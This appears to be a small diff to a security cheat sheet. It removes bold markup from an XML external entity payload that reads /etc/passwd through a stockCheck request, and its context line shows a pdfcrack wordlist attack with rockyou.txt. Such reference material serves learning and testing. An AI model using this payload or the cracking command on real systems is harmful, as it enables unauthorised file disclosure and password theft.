@@ -41,5 +41,5 @@ pdfcrack -f locked.pdf -w rockyou.txt
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE toto [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck><productId>**&xxe;**</productId></stockCheck> 
+<stockCheck><productId>&xxe;</productId></stockCheck> 
 ```
